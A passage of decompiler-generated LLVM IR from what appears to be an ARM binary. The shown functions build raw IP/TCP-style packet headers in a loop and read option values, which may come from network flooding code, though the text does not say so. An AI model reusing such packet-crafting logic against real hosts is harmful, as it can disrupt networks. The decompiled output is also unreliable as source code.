  %v3_c638 = inttoptr i32 %v2_c638 to i32*
  store i32 %v0_c638, i32* %v3_c638, align 4
  %v0_c63c = load i32, i32* %r2.global-to-local, align 4
  %v1_c63c = trunc i32 %v0_c63c to i8
  %v2_c63c = load i32, i32* @sb, align 4
  %v3_c63c = add i32 %v2_c63c, 56
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 %v1_c63c, i8* %v4_c63c, align 1
  %v0_c640 = load i32, i32* %r1.global-to-local, align 4
  %v1_c640 = trunc i32 %v0_c640 to i8
  %v2_c640 = load i32, i32* @sb, align 4
  %v3_c640 = add i32 %v2_c640, 58
  %v4_c640 = inttoptr i32 %v3_c640 to i8*
  store i8 %v1_c640, i8* %v4_c640, align 1
  %v0_c644 = load i32, i32* %r1.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* @sb, align 4
  %v3_c644 = add i32 %v2_c644, 57
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v3_c648 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c648, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r2.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, %v3_c648
  store i32 %v2_c64c, i32* @r4, align 4
  %v1_c650 = load i32, i32* @r7, align 4
  %v9_c650 = icmp eq i32 %v2_c64c, %v1_c650
  store i1 %v9_c650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c64c, i32* %stack_var_-44, align 4
  %v6_c658 = icmp slt i32 %v2_c64c, %v1_c650
  br i1 %v6_c658, label %dec_label_pc_c65c, label %dec_label_pc_c7f0.preheader

dec_label_pc_c7f0.preheader:                      ; preds = %dec_label_pc_c50c, %dec_label_pc_c46c
  %v0_c7f45 = phi i32 [ 0, %dec_label_pc_c46c ], [ %v1_c650, %dec_label_pc_c50c ]
  %v3_c850 = icmp eq i32 %v6_c420, -1
  %v8_c850 = icmp eq i32 %v6_c420, -1
  %v3_c86c = icmp eq i32 %v3_c494, 65535
  %v2_c75c = icmp eq i32 %v1_c49c, 0
  br label %dec_label_pc_c7f0

dec_label_pc_c65c:                                ; preds = %dec_label_pc_c50c, %dec_label_pc_c4b8
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c664 = call i32 @function_1320c(i32 128, i32 1)
  store i32 %v2_c28c, i32* %r2.global-to-local, align 4
  %v3_c66c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v2_c670 = load i32, i32* @r4, align 4
  %v5_c670 = mul i32 %v2_c670, 4
  %v6_c670 = add i32 %v5_c670, %v2_c28c
  %v7_c670 = inttoptr i32 %v6_c670 to i32*
  store i32 %v2_c664, i32* %v7_c670, align 4
  %v0_c674 = load i32, i32* %r2.global-to-local, align 4
  %v1_c674 = load i32, i32* %r3.global-to-local, align 4
  %v4_c674 = mul i32 %v1_c674, 4
  %v5_c674 = add i32 %v4_c674, %v0_c674
  %v6_c674 = inttoptr i32 %v5_c674 to i32*
  %v7_c674 = load i32, i32* %v6_c674, align 4
  store i32 %v7_c674, i32* @sb, align 4
  %v1_c678 = inttoptr i32 %v7_c674 to i8*
  %v2_c678 = load i8, i8* %v1_c678, align 1
  %tmp57 = urem i8 %v2_c678, 16
  %v1_c67c = zext i8 %tmp57 to i32
  %v1_c680 = or i32 %v1_c67c, 64
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  %v1_c684 = trunc i32 %v1_c680 to i8
  store i8 %v1_c684, i8* %v1_c678, align 1
  %v0_c688 = load i32, i32* @sb, align 4
  %v1_c688 = inttoptr i32 %v0_c688 to i8*
  %v2_c688 = load i8, i8* %v1_c688, align 1
  %v1_c68c = and i8 %v2_c688, -16
  %v1_c690 = or i8 %v1_c68c, 5
  store i8 %v1_c690, i8* %v1_c688, align 1
  store i32 %v4_c698, i32* %r3.global-to-local, align 4
  %v2_c6a0 = load i32, i32* @sb, align 4
  %v3_c6a0 = add i32 %v2_c6a0, 1
  %v4_c6a0 = inttoptr i32 %v3_c6a0 to i8*
  store i8 %v5_c2c4, i8* %v4_c6a0, align 1
  %v1_c6a4 = call i32 @function_1484c(i32 60)
  %v2_c6a4 = trunc i32 %v1_c6a4 to i16
  %v3_c6a8 = load i32, i32* @sb, align 4
  %v4_c6a8 = add i32 %v3_c6a8, 2
  %v5_c6a8 = inttoptr i32 %v4_c6a8 to i16*
  store i16 %v2_c6a4, i16* %v5_c6a8, align 2
  %v1_c6b0 = call i32 @function_1484c(i32 %v3_c494)
  %v2_c6b0 = trunc i32 %v1_c6b0 to i16
  store i32 %v1_c30c, i32* %r1.global-to-local, align 4
  store i32 %v4_c6b8, i32* %r2.global-to-local, align 4
  store i1 %v2_c6bc, i1* %cpsr_z.global-to-local, align 1
  %v3_c6c0 = load i32, i32* @sb, align 4
  %v4_c6c0 = add i32 %v3_c6c0, 4
  %v5_c6c0 = inttoptr i32 %v4_c6c0 to i16*
  store i16 %v2_c6b0, i16* %v5_c6c0, align 2
  %v0_c6c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v0_c6c4 to i8
  %v2_c6c4 = load i32, i32* @sb, align 4
  %v3_c6c4 = add i32 %v2_c6c4, 8
  %v4_c6c4 = inttoptr i32 %v3_c6c4 to i8*
  store i8 %v1_c6c4, i8* %v4_c6c4, align 1
  %v0_c6c8 = load i32, i32* @sb, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 20
  store i32 %v1_c6c8, i32* @sl, align 4
  %v0_c6cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6cc, label %dec_label_pc_c50c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c65c
  %v1_c6d4 = call i32 @function_1484c(i32 16384)
  %v2_c6d4 = trunc i32 %v1_c6d4 to i16
  %v3_c6d8 = load i32, i32* @sb, align 4
  %v4_c6d8 = add i32 %v3_c6d8, 6
  %v5_c6d8 = inttoptr i32 %v4_c6d8 to i16*
  store i16 %v2_c6d4, i16* %v5_c6d8, align 2
  %v2_c510.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c50c

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c7f0
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c764, %dec_label_pc_c6e0
  %v1_c6f8 = phi i32 [ %v1_c7e0, %dec_label_pc_c764 ], [ 0, %dec_label_pc_c6e0 ]
  %v5_c6e8 = mul i32 %v1_c6f8, 24
  %v1_c6ec = load i32, i32* @r8, align 4
  %v2_c6ec = add i32 %v1_c6ec, %v5_c6e8
  store i32 %v2_c6ec, i32* %r3.global-to-local, align 4
  store i32 %v2_c28c, i32* %r1.global-to-local, align 4
  %v1_c6f4 = add i32 %v2_c6ec, 20
  %v2_c6f4 = inttoptr i32 %v1_c6f4 to i8*
  %v3_c6f4 = load i8, i8* %v2_c6f4, align 1
  %v4_c6f4 = zext i8 %v3_c6f4 to i32
  store i32 %v4_c6f4, i32* %r2.global-to-local, align 4
  %v4_c6f8 = mul i32 %v1_c6f8, 4
  %v5_c6f8 = add i32 %v4_c6f8, %v2_c28c
  %v6_c6f8 = inttoptr i32 %v5_c6f8 to i32*
  %v7_c6f8 = load i32, i32* %v6_c6f8, align 4
  store i32 %v7_c6f8, i32* @r5, align 4
  %v7_c6fc = icmp eq i8 %v3_c6f4, 31
  store i1 %v7_c6fc, i1* %cpsr_z.global-to-local, align 1
  %v1_c700 = add i32 %v7_c6f8, 20
  store i32 %v1_c700, i32* @r6, align 4
  %tmp58 = icmp ult i8 %v3_c6f4, 32
  br i1 %tmp58, label %dec_label_pc_c820, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c6e4
  store i32 %v6_c420, i32* %r2.global-to-local, align 4
  store i1 %v8_c850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c850, label %dec_label_pc_c85c, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c820, %dec_label_pc_c708
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c86c, label %dec_label_pc_c878, label %dec_label_pc_c728

dec_label_pc_c728:                                ; preds = %dec_label_pc_c85c.dec_label_pc_c728_crit_edge, %dec_label_pc_c714
  %v1_c72c = phi i32 [ %v1_c72c.pre, %dec_label_pc_c85c.dec_label_pc_c728_crit_edge ], [ 65535, %dec_label_pc_c714 ]
  %v9_c72c = icmp eq i32 %v3_c498, %v1_c72c
  store i1 %v9_c72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c72c, label %dec_label_pc_c88c, label %dec_label_pc_c734

dec_label_pc_c734:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c728
  %v1_c738 = phi i32 [ %v1_c884, %dec_label_pc_c878 ], [ %v1_c72c, %dec_label_pc_c728 ]
  store i32 %v3_c484, i32* %r1.global-to-local, align 4
  %v9_c738 = icmp eq i32 %v3_c484, %v1_c738
  store i1 %v9_c738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c738, label %dec_label_pc_c8a0, label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c88c.dec_label_pc_c740_crit_edge, %dec_label_pc_c734
  %v1_c744 = phi i32 [ %v1_c744.pre, %dec_label_pc_c88c.dec_label_pc_c740_crit_edge ], [ %v1_c738, %dec_label_pc_c734 ]
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v9_c744 = icmp eq i32 %v6_c35c, %v1_c744
  store i1 %v9_c744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c744, label %dec_label_pc_c8b4, label %dec_label_pc_c74c

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge, %dec_label_pc_c740
  %v1_c750 = phi i32 [ %v1_c750.pre, %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge ], [ %v1_c744, %dec_label_pc_c740 ]
  store i32 %v6_c374, i32* %r3.global-to-local, align 4
  %v9_c750 = icmp eq i32 %v6_c374, %v1_c750
  store i1 %v9_c750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c750, label %dec_label_pc_c8c8, label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c74c, %dec_label_pc_c8c8
  store i1 %v2_c75c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c75c, label %dec_label_pc_c764, label %dec_label_pc_c814

dec_label_pc_c764:                                ; preds = %dec_label_pc_c758, %dec_label_pc_c814
  %v2_c768 = load i32, i32* @r5, align 4
  %v3_c768 = add i32 %v2_c768, 10
  %v4_c768 = inttoptr i32 %v3_c768 to i16*
  store i16 0, i16* %v4_c768, align 2
  %v0_c76c = load i32, i32* @r5, align 4
  store i32 %v0_c76c, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c774 = call i32 @function_dadc(i32 %v0_c76c, i32 20)
  %v3_c774 = trunc i32 %v2_c774 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c77c = load i32, i32* @r5, align 4
  %v4_c77c = add i32 %v3_c77c, 10
  %v5_c77c = inttoptr i32 %v4_c77c to i16*
  store i16 %v3_c774, i16* %v5_c77c, align 2
  %v0_c780 = load i32, i32* %r2.global-to-local, align 4
  %v1_c780 = trunc i32 %v0_c780 to i16
  %v2_c780 = load i32, i32* @r6, align 4
  %v3_c780 = add i32 %v2_c780, 16
  %v4_c780 = inttoptr i32 %v3_c780 to i16*
  store i16 %v1_c780, i16* %v4_c780, align 2
  %v1_c788 = call i32 @function_1484c(i32 40)
  %v0_c78c = load i32, i32* @r6, align 4
  store i32 %v0_c78c, i32* @r1, align 4
  store i32 %v1_c788, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_c798 = load i32, i32* @r5, align 4
  %v4_c79c = call i32 @function_db2c(i32 %v0_c798, i32 %v0_c78c, i32 %v1_c788, i32 40)
  %v5_c79c = trunc i32 %v4_c79c to i16
  %v3_c7a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a0, i32* %r3.global-to-local, align 4
  %v3_c7a4 = mul i32 %v3_c7a0, 32
  store i32 %v3_c7a4, i32* %lr.global-to-local, align 4
  %v3_c7a8 = load i32, i32* @r6, align 4
  %v4_c7a8 = add i32 %v3_c7a8, 16
  %v5_c7a8 = inttoptr i32 %v4_c7a8 to i16*
  store i16 %v5_c79c, i16* %v5_c7a8, align 2
  %v0_c7ac = load i32, i32* %lr.global-to-local, align 4
  %v1_c7ac = load i32, i32* %r3.global-to-local, align 4
  %tmp59 = mul i32 %v1_c7ac, -8
  %v5_c7ac = add i32 %v0_c7ac, %tmp59
  store i32 %v5_c7ac, i32* %lr.global-to-local, align 4
  %v0_c7b0 = load i32, i32* @r6, align 4
  %v1_c7b0 = add i32 %v0_c7b0, 2
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i16*
  %v3_c7b0 = load i16, i16* %v2_c7b0, align 2
  %v1_c7b4 = load i32, i32* @r8, align 4
  %v2_c7b4 = add i32 %v1_c7b4, %v5_c7ac
  store i32 %v2_c7b4, i32* @lr, align 4
  %v3_c7b8 = add i32 %v2_c7b4, 2
  %v4_c7b8 = inttoptr i32 %v3_c7b8 to i16*
  store i16 %v3_c7b0, i16* %v4_c7b8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c7c4 = load i32, i32* @r5, align 4
  store i32 %v0_c7c4, i32* @r1, align 4
  %v0_c7c8 = load i32, i32* @fp, align 4
  store i32 %v0_c7c8, i32* @r0, align 4
  store i32 60, i32* @r2, align 4
  %v0_c7d8 = call i32 @function_14a98()
  %v3_c7dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7dc, i32* %r3.global-to-local, align 4
  %v1_c7e0 = add i32 %v3_c7dc, 1
  %v1_c7e4 = load i32, i32* @r7, align 4
  %v9_c7e4 = icmp eq i32 %v1_c7e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7e0, i32* %stack_var_-44, align 4
  %v5_c7ec = icmp slt i32 %v1_c7e0, %v1_c7e4
  br i1 %v5_c7ec, label %dec_label_pc_c6e4, label %dec_label_pc_c7f0

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c764, %dec_label_pc_c7f0.preheader
  %v0_c804 = phi i32 [ %v0_c7f45, %dec_label_pc_c7f0.preheader ], [ 0, %dec_label_pc_c800 ], [ %v1_c7e4, %dec_label_pc_c764 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7f4 = icmp eq i32 %v0_c804, 0
  store i1 %v2_c7f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7f4, label %dec_label_pc_c800, label %dec_label_pc_c6e0

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_c7f0

dec_label_pc_c814:                                ; preds = %dec_label_pc_c758
  %v0_c814 = call i32 @function_f570()
  %v1_c814 = trunc i32 %v0_c814 to i16
  %v3_c818 = load i32, i32* @r6, align 4
  %v4_c818 = add i32 %v3_c818, 18
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v1_c814, i16* %v5_c818, align 2
  br label %dec_label_pc_c764

dec_label_pc_c820:                                ; preds = %dec_label_pc_c6e4
  %v1_c820 = add i32 %v2_c6ec, 16
  %v2_c820 = inttoptr i32 %v1_c820 to i32*
  %v3_c820 = load i32, i32* %v2_c820, align 4
  %v1_c824 = call i32 @function_149d0(i32 %v3_c820)
  store i32 %v1_c824, i32* %r4.global-to-local, align 4
  %v0_c82c = call i32 @function_f570()
  %v3_c830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c830, i32* %r2.global-to-local, align 4
  %v5_c838 = mul i32 %v3_c830, 24
  %v1_c83c = load i32, i32* @r8, align 4
  %v2_c83c = add i32 %v1_c83c, %v5_c838
  store i32 %v2_c83c, i32* %r3.global-to-local, align 4
  %v1_c840 = add i32 %v2_c83c, 20
  %v2_c840 = inttoptr i32 %v1_c840 to i8*
  %v3_c840 = load i8, i8* %v2_c840, align 1
  %v4_c840 = zext i8 %v3_c840 to i32
  store i32 %v4_c840, i32* %r2.global-to-local, align 4
  %v0_c844 = load i32, i32* %r4.global-to-local, align 4
  %v7_c844 = lshr i32 %v0_c82c, %v4_c840
  %v8_c844 = add i32 %v7_c844, %v0_c844
  %v1_c848 = call i32 @function_14828(i32 %v8_c844)
  store i32 %v6_c420, i32* %r2.global-to-local, align 4
  store i1 %v8_c850, i1* %cpsr_z.global-to-local, align 1
  %v1_c854 = load i32, i32* @r5, align 4
  %v2_c854 = add i32 %v1_c854, 16
  %v3_c854 = inttoptr i32 %v2_c854 to i32*
  store i32 %v1_c848, i32* %v3_c854, align 4
  br i1 %v3_c850, label %dec_label_pc_c85c, label %dec_label_pc_c714

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c820, %dec_label_pc_c708
  %v0_c85c = call i32 @function_f570()
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c86c, i1* %cpsr_z.global-to-local, align 1
  %v1_c870 = load i32, i32* @r5, align 4
  %v2_c870 = add i32 %v1_c870, 12
  %v3_c870 = inttoptr i32 %v2_c870 to i32*
  store i32 %v0_c85c, i32* %v3_c870, align 4
  br i1 %v3_c86c, label %dec_label_pc_c878, label %dec_label_pc_c85c.dec_label_pc_c728_crit_edge

dec_label_pc_c85c.dec_label_pc_c728_crit_edge:    ; preds = %dec_label_pc_c85c
  %v1_c72c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c728

dec_label_pc_c878:                                ; preds = %dec_label_pc_c85c, %dec_label_pc_c714
  %v0_c878 = call i32 @function_f570()
  %v1_c878 = trunc i32 %v0_c878 to i16
  %v3_c87c = load i32, i32* @r5, align 4
  %v4_c87c = add i32 %v3_c87c, 4
  %v5_c87c = inttoptr i32 %v4_c87c to i16*
  store i16 %v1_c878, i16* %v5_c87c, align 2
  %v1_c884 = load i32, i32* @r4, align 4
  %v9_c884 = icmp eq i32 %v3_c498, %v1_c884
  store i1 %v9_c884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c884, label %dec_label_pc_c88c, label %dec_label_pc_c734

dec_label_pc_c88c:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c728
  %v0_c88c = call i32 @function_f570()
  %v1_c88c = trunc i32 %v0_c88c to i16
  store i32 %v3_c484, i32* %r1.global-to-local, align 4
  %v1_c894 = load i32, i32* @r4, align 4
  %v9_c894 = icmp eq i32 %v3_c484, %v1_c894
  store i1 %v9_c894, i1* %cpsr_z.global-to-local, align 1
  %v3_c898 = load i32, i32* @r5, align 4
  %v4_c898 = add i32 %v3_c898, 20
  %v5_c898 = inttoptr i32 %v4_c898 to i16*
  store i16 %v1_c88c, i16* %v5_c898, align 2
  br i1 %v9_c894, label %dec_label_pc_c8a0, label %dec_label_pc_c88c.dec_label_pc_c740_crit_edge

dec_label_pc_c88c.dec_label_pc_c740_crit_edge:    ; preds = %dec_label_pc_c88c
  %v1_c744.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c740

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c88c, %dec_label_pc_c734
  %v0_c8a0 = call i32 @function_f570()
  %v1_c8a0 = trunc i32 %v0_c8a0 to i16
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v1_c8a8 = load i32, i32* @r4, align 4
  %v9_c8a8 = icmp eq i32 %v6_c35c, %v1_c8a8
  store i1 %v9_c8a8, i1* %cpsr_z.global-to-local, align 1
  %v3_c8ac = load i32, i32* @r6, align 4
  %v4_c8ac = add i32 %v3_c8ac, 2
  %v5_c8ac = inttoptr i32 %v4_c8ac to i16*
  store i16 %v1_c8a0, i16* %v5_c8ac, align 2
  br i1 %v9_c8a8, label %dec_label_pc_c8b4, label %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge

dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge:    ; preds = %dec_label_pc_c8a0
  %v1_c750.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c74c

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c8a0, %dec_label_pc_c740
  %v0_c8b4 = call i32 @function_f570()
  store i32 %v6_c374, i32* %r3.global-to-local, align 4
  %v1_c8bc = load i32, i32* @r4, align 4
  %v9_c8bc = icmp eq i32 %v6_c374, %v1_c8bc
  store i1 %v9_c8bc, i1* %cpsr_z.global-to-local, align 1
  %v1_c8c0 = load i32, i32* @r6, align 4
  %v2_c8c0 = add i32 %v1_c8c0, 4
  %v3_c8c0 = inttoptr i32 %v2_c8c0 to i32*
  store i32 %v0_c8b4, i32* %v3_c8c0, align 4
  br i1 %v9_c8bc, label %dec_label_pc_c8c8, label %dec_label_pc_c758

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c74c
  %v0_c8c8 = call i32 @function_f570()
  %v1_c8cc = load i32, i32* @r6, align 4
  %v2_c8cc = add i32 %v1_c8cc, 8
  %v3_c8cc = inttoptr i32 %v2_c8cc to i32*
  store i32 %v0_c8c8, i32* %v3_c8cc, align 4
  br label %dec_label_pc_c758

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c444
  %v0_c8d4 = load i32, i32* @fp, align 4
  store i32 %v0_c8d4, i32* @r0, align 4
  %v1_c8d8 = call i32 @function_15b20(i32 %v0_c8d4)
  br label %dec_label_pc_c8dc

dec_label_pc_c8dc:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c8d4
  %v1_c8e4 = phi i32 [ %v3_c434, %dec_label_pc_c270 ], [ %v1_c8d8, %dec_label_pc_c8d4 ]
  store i32 %v3_c270, i32* %r4.global-to-local, align 4
  store i32 %v27_c270, i32* %lr.global-to-local, align 4
  ret i32 %v1_c8e4

; uselistorder directives
  uselistorder i32 %v1_c884, { 1, 0 }
  uselistorder i32 %v1_c7e0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c7ac, { 1, 0 }
  uselistorder i32 %v0_c6c8, { 1, 0 }
  uselistorder i1 %v3_c86c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c64c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c4ec, { 2, 1, 0 }
  uselistorder i32 %v1_c4e8, { 2, 0, 1 }
  uselistorder i32 %v1_c4e4, { 2, 0, 1 }
  uselistorder i32 %v1_c4e0, { 2, 0, 1 }
  uselistorder i32 %v1_c4dc, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v1_c49c, { 1, 0 }
  uselistorder i32 %v3_c494, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_c464, { 1, 0 }
  uselistorder i1 %v7_c438, { 1, 0 }
  uselistorder i32 %v3_c434, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c420, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v6_c374, { 3, 2, 1, 0 }
  uselistorder i32 %v6_c35c, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 %v5_c2c4, { 1, 0 }
  uselistorder i32 %v2_c28c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 28, 29, 30, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 24, 25, 26, 27, 28, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 17, 20, 21, 22 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c8dc, { 1, 0 }
  uselistorder label %dec_label_pc_c764, { 1, 0 }
  uselistorder label %dec_label_pc_c758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c50c, { 1, 0 }
}

define i32 @function_c8ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c8ec:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_c8ec = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c908 = call i32 @function_1320c(i32 %arg1, i32 4)
  store i32 %v2_c908, i32* @sl, align 4
  %v0_c914 = load i32, i32* @r7, align 4
  %v2_c918 = call i32 @function_1320c(i32 %v0_c914, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_c924 = load i32, i32* @r6, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_c918, i32* @r8, align 4
  %v0_c934 = load i32, i32* @r5, align 4
  %v4_c938 = inttoptr i32 %v0_c924 to i32*
  %v5_c938 = call i32 @function_a430(i32 %v0_c934, i32* %v4_c938, i32 7, i32 65535)
  %v3_c940 = urem i32 %v5_c938, 65536
  %v0_c944 = load i32, i32* @r6, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c94c = load i32, i32* @r4, align 4
  store i32 %v0_c94c, i32* %r3.global-to-local, align 4
  %v0_c950 = load i32, i32* @r5, align 4
  %v5_c958 = inttoptr i32 %v0_c944 to i32*
  %v6_c958 = call i32 @function_a430(i32 %v0_c950, i32* %v5_c958, i32 6, i32 %v0_c94c)
  %v0_c95c = load i32, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c96c = load i32, i32* @r5, align 4
  %v3_c970 = urem i32 %v6_c958, 65536
  store i32 %v3_c970, i32* %sb.global-to-local, align 4
  %v4_c974 = inttoptr i32 %v0_c95c to i32*
  %v5_c974 = call i32 @function_a430(i32 %v0_c96c, i32* %v4_c974, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c984 = load i32, i32* @r5, align 4
  %v0_c988 = load i32, i32* @r6, align 4
  %v3_c98c = urem i32 %v5_c974, 65536
  store i32 %v3_c98c, i32* @r5, align 4
  %v4_c990 = inttoptr i32 %v0_c988 to i32*
  %v5_c990 = call i32 @function_a430(i32 %v0_c984, i32* %v4_c990, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c998 = urem i32 %v5_c990, 256
  %v0_c99c = load i32, i32* %sb.global-to-local, align 4
  %v1_c99c = load i32, i32* @r4, align 4
  %v9_c99c = icmp eq i32 %v0_c99c, %v1_c99c
  store i32 0, i32* %stack_var_-56, align 4
  br i1 %v9_c99c, label %dec_label_pc_cb24, label %dec_label_pc_c9b8

dec_label_pc_c9b8:                                ; preds = %dec_label_pc_c8ec
  %v1_c9bc = call i32 @function_1484c(i32 %v0_c99c)
  %v2_c9bc = trunc i32 %v1_c9bc to i16
  br label %dec_label_pc_c9c4

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_cb24, %dec_label_pc_c9b8
  %storemerge2 = phi i16 [ %v5_cb30, %dec_label_pc_cb24 ], [ %v2_c9bc, %dec_label_pc_c9b8 ]
  %v0_c9c4 = load i32, i32* @r7, align 4
  %v2_c9c4 = icmp eq i32 %v0_c9c4, 0
  br i1 %v2_c9c4, label %dec_label_pc_cae8, label %dec_label_pc_c9cc

dec_label_pc_c9cc:                                ; preds = %dec_label_pc_c9c4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v2_ca08 = ptrtoint i32* %stack_var_-56 to i32
  %v4_ca28 = sext i16 %storemerge2 to i32
  br label %dec_label_pc_ca5c

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_ca5c
  %v1_c9dc = call i32 @function_1484c(i32 %v3_c940)
  %v2_c9dc = trunc i32 %v1_c9dc to i16
  store i32 %stack_var_-60.0, i32* %r3.global-to-local, align 4
  %v3_c9e4 = load i32, i32* @r6, align 4
  %v4_c9e4 = add i32 %v3_c9e4, 2
  %v5_c9e4 = inttoptr i32 %v4_c9e4 to i16*
